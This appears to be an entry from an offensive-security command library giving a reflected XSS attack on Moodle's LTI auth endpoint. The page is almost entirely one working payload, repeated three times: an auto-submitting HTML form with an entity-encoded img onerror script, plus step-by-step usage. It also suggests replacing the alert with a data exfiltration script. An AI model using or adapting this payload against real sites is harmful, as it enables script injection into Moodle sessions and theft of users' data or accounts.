---
id: cmd-xss-html-2024
data: >-
  <html>

  <body>

  <form action="https://target.com/mod/lti/auth.php?" method="POST">

  <input type="hidden"
  name="xxx&quot;&gt;&lt;img&#47;src&#61;&apos;x&apos;onerror&#61;alert&#40;&apos;document&#95;domain&apos;&#41;&gt;"
  value="1" />

  <input type="submit" value="Submit request" />

  </form>

  <script>

  history.pushState('', '', '/');

  document.forms[0].submit();

  </script>

  </body>

  </html>
tags:
  - xss
  - payload
  - html
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.422Z'
verified: false
validated: true
submitted: true
---
# deliver-xss-html-form

## Command

```html
<html>
<body>
<form action="https://target.com/mod/lti/auth.php?" method="POST">
<input type="hidden" name="xxx&quot;&gt;&lt;img&#47;src&#61;&apos;x&apos;onerror&#61;alert&#40;&apos;document&#95;domain&apos;&#41;&gt;" value="1" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```

## Description

This HTML snippet creates an auto-submitting form to deliver the reflected XSS payload to the Moodle LTI endpoint, executing JavaScript upon victim interaction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `action` | Target endpoint URL (e.g., https://target.com/mod/lti/auth.php?) | Yes |
| `name` | Hidden input name with encoded XSS payload | Yes |
| `value` | Form value (set to 1) | Yes |

## Examples

### Basic Usage

Save as HTML file and load in browser:

```html
<html><body><form action="https://target.com/mod/lti/auth.php?" method="POST"><input type="hidden" name="xxx&quot;&gt;&lt;img&#47;src&#61;&apos;x&apos;onerror&#61;alert&#40;&apos;document&#95;domain&apos;&#41;&gt;" value="1" /><input type="submit" value="Submit request" /></form><script>history.pushState('', '', '/');document.forms[0].submit();</script></body></html>
```

### Advanced Usage

Modify payload for custom JS, e.g., replace alert with data exfiltration script.

## Expected Output

Browser executes the onerror handler, popping an alert or running custom JS in the Moodle context.

## Related

- [[Related Procedure: Deliver-Reflected-XSS-Payload-via-Auto-Submitting-HTML-Form]]
